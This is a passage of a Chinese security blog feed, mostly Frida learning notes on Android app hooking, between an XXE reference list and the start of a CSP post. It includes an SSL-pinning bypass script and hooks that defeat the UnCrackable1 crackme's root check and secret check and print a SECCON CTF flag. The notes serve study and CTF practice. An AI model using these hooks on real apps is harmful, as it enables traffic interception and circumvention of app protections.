<li>实际渗透测试生活中遇到的xxe漏洞 <h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3></li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/2427</span><br><span class="line">https://mp.weixin.qq.com/s/xV7vtJmFL0FkPX05kiLNVw</span><br><span class="line">https://github.com/Wechat-Group/WxJava/issues/889</span><br><span class="line">https://github.com/Wechat-Group/WxJava/issues/903</span><br><span class="line">https://blog.csdn.net/u013224189/article/details/80902339</span><br></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> XXE 实例利用 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[frida理解与学习]]></title>
      <url>/2019/01/22/%E7%A7%BB%E5%8A%A8%E7%AB%AF/frida1/</url>
      <content type="html"><![CDATA[<p>【1】pip install frida</p>
<p>【2】sudo pip install frida-tools</p>
<p>【3】我这里使用的测试机cpuinfo是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Processor	: ARMv7 Processor rev 0 (v7l)</span><br></pre></td></tr></table></figure></p>
<p>所以下载的对应的server版本是frida-server-12.2.29-android-arm</p>
<p>在启动对应的sever后，可以不用端口转发直接测试链接 </p>
<p>frida-ps -U：在另一个终端的常规操作系统shell中检测frida中进程</p>
<p>frida-trace : 跟踪由对应应用使用的特定调用</p>
<p>如 跟踪chrome使用的open应用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -i &quot;open&quot; -U com.android.chrome</span><br></pre></td></tr></table></figure></p>
<p>内心os（不知道特么是什么玄学问题，直接用的现目前最新版29，死活有问题，都快怀疑人生了，换了下24低版本，可以正常使用）</p>
<h3 id="测试功能"><a href="#测试功能" class="headerlink" title="测试功能"></a>测试功能</h3><h4 id="python-枚举android手机所有的进程"><a href="#python-枚举android手机所有的进程" class="headerlink" title="python 枚举android手机所有的进程"></a>python 枚举android手机所有的进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import frida</span><br><span class="line">rdev = frida.get_remote_device()</span><br><span class="line">processes = rdev.enumerate_processes()</span><br><span class="line">for process in processes:</span><br><span class="line">    print (process)</span><br></pre></td></tr></table></figure>
<h4 id="js-测试"><a href="#js-测试" class="headerlink" title="js 测试"></a>js 测试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function()&#123;</span><br><span class="line">  Java.perform(function()&#123;</span><br><span class="line">      console.log(&quot;hello world!&quot;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h4 id="frida-ssl-unpinning-待细看"><a href="#frida-ssl-unpinning-待细看" class="headerlink" title="frida ssl unpinning(待细看)"></a>frida ssl unpinning(待细看)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function() &#123;                </span><br><span class="line">    var array_list = Java.use(&quot;java.util.ArrayList&quot;);</span><br><span class="line">    var ApiClient = Java.use(&apos;com.android.org.conscrypt.TrustManagerImpl&apos;);</span><br><span class="line">    // console.log(&apos;Start ssl bypass.&apos;);</span><br><span class="line"></span><br><span class="line">    ApiClient.checkTrustedRecursive.implementation = function(a1,a2,a3,a4,a5,a6) &#123;</span><br><span class="line">        console.log(&apos;Bypassing SSL Pinning&apos;);</span><br><span class="line">        var k = array_list.$new(); </span><br><span class="line">        return k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,0);</span><br></pre></td></tr></table></figure>
<p>在进行后面初学测试后，回头看 才发现这个并不是之前以为的通用版，是hook了com.android.org.conscrypt.TrustManagerImpl类的checkTrustedRecursive函数，猜测是作者在对应应用的校验函数。</p>
<h2 id="初学"><a href="#初学" class="headerlink" title="初学"></a>初学</h2><h3 id="功能模块"><a href="#功能模块" class="headerlink" title="功能模块"></a>功能模块</h3><h4 id="访问进程内存"><a href="#访问进程内存" class="headerlink" title="访问进程内存"></a>访问进程内存</h4><p>read_bytes(address, n)</p>
<p>write_bytes(address, data)</p>
<h5 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h5><ol>
<li>利用Frida从TeamViewer内存中提取密码（暂未复现）</li>
</ol>
<h4 id="在应用程序运行时覆盖函数"><a href="#在应用程序运行时覆盖函数" class="headerlink" title="在应用程序运行时覆盖函数"></a>在应用程序运行时覆盖函数</h4><p>implementation 覆盖了原函数，进行重执行</p>
<h4 id="从导入的类调用函数"><a href="#从导入的类调用函数" class="headerlink" title="从导入的类调用函数"></a>从导入的类调用函数</h4><p>这个也是默认的功能，可以直接调用java.use的导入需求的类，然后通过 this.a 调用原函数，调用情况在下面例子中有。</p>
<p>当需要打印成员数据时，可以调用.value属性来访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var ah = Java.use(&quot;com/miui/virtualsim/utils/ah&quot;);</span><br><span class="line">console.log(&quot;To Log: &quot; + ah.a.value);</span><br><span class="line">ah.a.value = true;</span><br></pre></td></tr></table></figure></p>
<h4 id="在堆上查找对象实例并使用他们"><a href="#在堆上查找对象实例并使用他们" class="headerlink" title="在堆上查找对象实例并使用他们"></a>在堆上查找对象实例并使用他们</h4><h4 id="Hook、追踪和拦截函数"><a href="#Hook、追踪和拦截函数" class="headerlink" title="Hook、追踪和拦截函数"></a>Hook、追踪和拦截函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/u011337769/article/details/82855818</span><br><span class="line">https://www.52pojie.cn/thread-848126-1-1.html</span><br><span class="line">https://blog.csdn.net/qingemengyue/article/details/79871926</span><br></pre></td></tr></table></figure>
<h4 id="crack-学习"><a href="#crack-学习" class="headerlink" title="crack 学习"></a>crack 学习</h4><h5 id="ex1"><a href="#ex1" class="headerlink" title="ex1"></a>ex1</h5><p>因为不知道的什么原因，我这里的frida在使用-f（spawn）的时候就会报错，not connection，所以不能spwan模式在重启程序时调试。只能着眼于已进入mainActivity程序后续进行hook </p>
<h6 id="如何修改Java层的函数参数和返回值"><a href="#如何修改Java层的函数参数和返回值" class="headerlink" title="如何修改Java层的函数参数和返回值"></a>如何修改Java层的函数参数和返回值</h6><ul>
<li>apk解析 首先找mainActivity中的oncreate方法，这个是在activity创建时即执行的方法</li>
</ul>
<ol>
<li>mainActivity<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">package sg.vantagepoint.uncrackable1;</span><br><span class="line"></span><br><span class="line">import android.app.Activity;</span><br><span class="line">import android.app.AlertDialog;</span><br><span class="line">import android.app.AlertDialog.Builder;</span><br><span class="line">import android.os.Bundle;</span><br><span class="line">import android.view.View;</span><br><span class="line">import android.widget.EditText;</span><br><span class="line">import sg.vantagepoint.a.b;</span><br><span class="line">import sg.vantagepoint.a.c;</span><br><span class="line"></span><br><span class="line">public class MainActivity extends Activity &#123;</span><br><span class="line">    private void a(String str) &#123;</span><br><span class="line">        AlertDialog create = new Builder(this).create();</span><br><span class="line">        create.setTitle(str);</span><br><span class="line">        create.setMessage(&quot;This in unacceptable. The app is now going to exit.&quot;);</span><br><span class="line">        create.setButton(-3, &quot;OK&quot;, new b(this));</span><br><span class="line">        create.setCancelable(false);</span><br><span class="line">        create.show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected void onCreate(Bundle bundle) &#123;</span><br><span class="line">        if (c.a() || c.b() || c.c()) &#123;</span><br><span class="line">            a(&quot;Root detected!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (b.a(getApplicationContext())) &#123;</span><br><span class="line">            a(&quot;App is debuggable!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        super.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void verify(View view) &#123;</span><br><span class="line">        String obj = ((EditText) findViewById(R.id.edit_text)).getText().toString();</span><br><span class="line">        AlertDialog create = new Builder(this).create();</span><br><span class="line">        if (a.a(obj)) &#123;</span><br><span class="line">            create.setTitle(&quot;Success!&quot;);</span><br><span class="line">            create.setMessage(&quot;This is the correct secret.&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            create.setTitle(&quot;Nope...&quot;);</span><br><span class="line">            create.setMessage(&quot;That&apos;s not it. Try again.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        create.setButton(-3, &quot;OK&quot;, new c(this));</span><br><span class="line">        create.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>在该apk调用中，在mainAc中onCreate- create.setButton(-3, “OK”, new b(this));</p>
<ol start="2">
<li>b类<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package sg.vantagepoint.uncrackable1;</span><br><span class="line"></span><br><span class="line">import android.content.DialogInterface;</span><br><span class="line">import android.content.DialogInterface.OnClickListener;</span><br><span class="line"></span><br><span class="line">class b implements OnClickListener &#123;</span><br><span class="line">    final /* synthetic */ MainActivity a;</span><br><span class="line"></span><br><span class="line">    b(MainActivity mainActivity) &#123;</span><br><span class="line">        this.a = mainActivity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void onClick(DialogInterface dialogInterface, int i) &#123;</span><br><span class="line">        System.exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>调用后退出应用。</p>
<ul>
<li>注入js解析<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(function() &#123; //prevent timeout</span><br><span class="line">    console.log(&quot;[*] Starting script&quot;);</span><br><span class="line"></span><br><span class="line">    Java.perform(function() &#123;</span><br><span class="line"></span><br><span class="line">      bClass = Java.use(&quot;sg.vantagepoint.uncrackable1.b&quot;);</span><br><span class="line">      bClass.onClick.implementation = function(v) &#123;</span><br><span class="line">         console.log(&quot;[*] onClick called&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      console.log(&quot;[*] onClick handler modified&quot;)</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ol>
<li><p>在该js中 Java.perform相当于main函数；获取sg.vantagepoint.uncrackable1.b 类，然后调用onclick模拟点击事件,让本该退出的成为 调用后输出console.log<br>修改：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(function() &#123; //prevent timeout</span><br><span class="line">    console.log(&quot;[*] Starting script&quot;);</span><br><span class="line"></span><br><span class="line">    Java.perform(function() &#123;</span><br><span class="line"></span><br><span class="line">      bClass = Java.use(&quot;sg.vantagepoint.uncrackable1.b&quot;);</span><br><span class="line">      aClass = Java.use(&quot;sg.vantagepoint.uncrackable1.c&quot;);</span><br><span class="line">      bClass.onClick.implementation = function(v) &#123;</span><br><span class="line">         console.log(&quot;[*] onClick called bb&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      aClass.onClick.implementation = function(v) &#123;</span><br><span class="line">         console.log(&quot;[*] onClick called aa&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      console.log(&quot;[*] onClick handler modified&quot;)</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>在该apk中，调用原aes加密函数 sg.vantagepoint.a.a函数，进行解密，将结果输出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(function() &#123; //prevent timeout</span><br><span class="line">    console.log(&quot;[*] Starting script&quot;);</span><br><span class="line"></span><br><span class="line">    Java.perform(function() &#123;</span><br><span class="line"></span><br><span class="line">      bClass = Java.use(&quot;sg.vantagepoint.uncrackable1.b&quot;);</span><br><span class="line">      bClass.onClick.implementation = function(v) &#123;</span><br><span class="line">         console.log(&quot;[*] onClick called&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      aaclass = Java.use(&quot;sg.vantagepoint.a.a&quot;);</span><br><span class="line">      aaclass.a.implementation = function (arg1, arg2) &#123;</span><br><span class="line">       pass = &quot;&quot;;</span><br><span class="line">       s = this.a(arg1, arg2); </span><br><span class="line">       for(i=0; i&lt;s.length; i++) &#123;</span><br><span class="line">                  pass += String.fromCharCode(s[i]);</span><br><span class="line">              &#125;</span><br><span class="line">              console.log(&quot;[*] content: &quot; + pass);</span><br><span class="line">return s;&#125;</span><br><span class="line">      console.log(&quot;[*] onClick handler modified&quot;)</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>在该apk中，hook输出最后的校验函数 sg.vantagepoint.uncrackable1.a.a函数结果，使其一直返回true</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(function() &#123; //prevent timeout</span><br><span class="line">    console.log(&quot;[*] Starting script&quot;);</span><br><span class="line"></span><br><span class="line">    Java.perform(function() &#123;</span><br><span class="line"></span><br><span class="line">      bClass = Java.use(&quot;sg.vantagepoint.uncrackable1.b&quot;);</span><br><span class="line">      bClass.onClick.implementation = function(v) &#123;</span><br><span class="line">         console.log(&quot;[*] onClick called&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      aaclass = Java.use(&quot;sg.vantagepoint.uncrackable1.a&quot;);</span><br><span class="line">      aaclass.a.implementation = function (arg1) &#123;</span><br><span class="line">       </span><br><span class="line">      return true;</span><br><span class="line">    &#125;</span><br><span class="line">      console.log(&quot;[*] onClick handler modified&quot;)</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h5 id="ex2"><a href="#ex2" class="headerlink" title="ex2"></a>ex2</h5><p>场景参考在这里：<br><a href="https://bbs.pediy.com/thread-227232.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-227232.htm</a></p>
<h6 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h6><p>同上先看oncreate函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        this.P = (Button) findViewById(R.id.button);</span><br><span class="line">        this.S = (Button) findViewById(R.id.button3);</span><br><span class="line">        this.r = (Button) findViewById(R.id.buttonR);</span><br><span class="line">        this.P.setOnClickListener(this);</span><br><span class="line">        this.r.setOnClickListener(this);</span><br><span class="line">        this.S.setOnClickListener(this);</span><br><span class="line">        this.flag = 0;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>菜鸟学android什么都的查emmmmm</p>
<p><strong>Bundle savedInstanceState：</strong><br>经常会出现用户按到home键，退出了界面，或者安卓系统意外回收了应用的进程，这种情况下，使用Bundle savedInstanceState就可以用户再次打开应用的时候恢复的原来的状态，剩下的声明了button控件和事件的监听</p>
<p>onClick函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public void onClick(View v) &#123;</span><br><span class="line">       if (this.flag != 1) &#123;</span><br><span class="line">           this.flag = 1;</span><br><span class="line">           ((TextView) findViewById(R.id.textView3)).setText(&quot;&quot;);</span><br><span class="line">           TextView tv = (TextView) findViewById(R.id.textView);</span><br><span class="line">           TextView tv2 = (TextView) findViewById(R.id.textView2);</span><br><span class="line">           this.m = 0;</span><br><span class="line">           this.n = new Random().nextInt(3);</span><br><span class="line">           tv2.setText(new String[]&#123;&quot;CPU: Paper&quot;, &quot;CPU: Rock&quot;, &quot;CPU: Scissors&quot;&#125;[this.n]);</span><br><span class="line">           if (v == this.P) &#123;</span><br><span class="line">               tv.setText(&quot;YOU: Paper&quot;);</span><br><span class="line">               this.m = 0;</span><br><span class="line">           &#125;</span><br><span class="line">           if (v == this.r) &#123;</span><br><span class="line">               tv.setText(&quot;YOU: Rock&quot;);</span><br><span class="line">               this.m = 1;</span><br><span class="line">           &#125;</span><br><span class="line">           if (v == this.S) &#123;</span><br><span class="line">               tv.setText(&quot;YOU: Scissors&quot;);</span><br><span class="line">               this.m = 2;</span><br><span class="line">           &#125;</span><br><span class="line">           this.handler.postDelayed(this.showMessageTask, 1000);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
<p>postDelayed：创建多线程消息的函数，类似于定时器，每秒触发一下this.showMessageTask<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">private final Runnable showMessageTask = new Runnable() &#123;</span><br><span class="line">        public void run() &#123;</span><br><span class="line">            TextView tv3 = (TextView) MainActivity.this.findViewById(R.id.textView3);</span><br><span class="line">            MainActivity mainActivity;</span><br><span class="line">            if (MainActivity.this.n - MainActivity.this.m == 1) &#123;</span><br><span class="line">                mainActivity = MainActivity.this;</span><br><span class="line">                mainActivity.cnt++;</span><br><span class="line">                tv3.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">            &#125; else if (MainActivity.this.m - MainActivity.this.n == 1) &#123;</span><br><span class="line">                MainActivity.this.cnt = 0;</span><br><span class="line">                tv3.setText(&quot;LOSE +0&quot;);</span><br><span class="line">            &#125; else if (MainActivity.this.m == MainActivity.this.n) &#123;</span><br><span class="line">                tv3.setText(&quot;DRAW +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">            &#125; else if (MainActivity.this.m &lt; MainActivity.this.n) &#123;</span><br><span class="line">                MainActivity.this.cnt = 0;</span><br><span class="line">                tv3.setText(&quot;LOSE +0&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                mainActivity = MainActivity.this;</span><br><span class="line">                mainActivity.cnt++;</span><br><span class="line">                tv3.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">            &#125;</span><br><span class="line">            if (1000 == MainActivity.this.cnt) &#123;</span><br><span class="line">                tv3.setText(&quot;SECCON&#123;&quot; + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + &quot;&#125;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.this.flag = 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></p>
<p>根据例子一以及源码分析，该问题需要hook com.example.seccon2015.rock_paper.scissors.MainActivity中的showMessageTask函数,使其直接执行<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (1000 == MainActivity.this.cnt) &#123;</span><br><span class="line">               tv3.setText(&quot;SECCON&#123;&quot; + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + &quot;&#125;&quot;);</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure></p>
<p>构造js如下，hook掉对应的onclick函数-1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(function() &#123; //prevent timeout</span><br><span class="line">    console.log(&quot;[*] Starting script&quot;);</span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line"></span><br><span class="line">    var mClass = Java.use(&apos;com.example.seccon2015.rock_paper_scissors.MainActivity&apos;);</span><br><span class="line">    mClass.onClick.implementation = function () &#123;</span><br><span class="line">        console.log(&quot;Hook Start...&quot;);</span><br><span class="line">        console.log(&quot;SECCON&#123;&quot; + (1000 + this.calc())*107 + &quot;&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>构造js如下，hook掉对应的onclick函数-2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(function() &#123; //prevent timeout</span><br><span class="line">    console.log(&quot;[*] Starting script&quot;);</span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line">//定义变量MainActivity，Java.use指定要使用的类</span><br><span class="line">    var MainActivity = Java.use(&apos;com.example.seccon2015.rock_paper_scissors.MainActivity&apos;);</span><br><span class="line">    //hook该类下的onCreate方法，重新实现它</span><br><span class="line">    MainActivity.onClick.implementation = function () &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        //调用calc()方法，获取返回值</span><br><span class="line">        var returnValue = this.calc();</span><br><span class="line">        send(&quot;Return:&quot;+returnValue);</span><br><span class="line">        var result = (1000+returnValue)*107;</span><br><span class="line">        //解出答案</span><br><span class="line">        send(&quot;Flag:&quot;+&quot;SECCON&#123;&quot;+result.toString()+&quot;&#125;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h5 id="如何打印Java层的方法堆栈信息"><a href="#如何打印Java层的方法堆栈信息" class="headerlink" title="如何打印Java层的方法堆栈信息"></a>如何打印Java层的方法堆栈信息</h5><p>枚举内存范围 enumerate_ranges(mask)</p>
<h5 id="如何拦截native层的函数参数和返回值"><a href="#如何拦截native层的函数参数和返回值" class="headerlink" title="如何拦截native层的函数参数和返回值"></a>如何拦截native层的函数参数和返回值</h5><h4 id="需要理解的问题"><a href="#需要理解的问题" class="headerlink" title="需要理解的问题"></a>需要理解的问题</h4><h5 id="java反射"><a href="#java反射" class="headerlink" title="java反射"></a>java反射</h5><h5 id="动态代码插桩DBI"><a href="#动态代码插桩DBI" class="headerlink" title="动态代码插桩DBI"></a>动态代码插桩DBI</h5><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://www.52pojie.cn/thread-848126-1-1.html</span><br><span class="line">https://blog.csdn.net/omnispace/article/details/70598829</span><br><span class="line">https://codemetrix.net/hacking-android-apps-with-frida-2/</span><br><span class="line">https://www.frida.re/docs/javascript-api/#java</span><br><span class="line">https://github.com/iromise/AOS-Note/blob/42544f4635e6238e2d7ddbc6e4e1789c20d2c130/frida-exp/frida.md</span><br><span class="line">https://bbs.pediy.com/thread-227232.htm</span><br><span class="line">https://www.cnblogs.com/qwangxiao/p/9255328.html</span><br></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> 移动端 </tag>
            
            <tag> frida </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[安全策略-csp理解与学习]]></title>
      <url>/2019/01/10/%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/csp/</url>
      <content type="html"><![CDATA[<h1 id="内容安全策略-CSP"><a href="#内容安全策略-CSP" class="headerlink" title="内容安全策略 CSP"></a>内容安全策略 CSP</h1><p>百度百科概念： </p>
<p>CSP指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容</p>
<p>直白的说就是通过该浏览器扩展 进行 加载资源脚本的黑白名单限制；实现和执行均由浏览器完成</p>
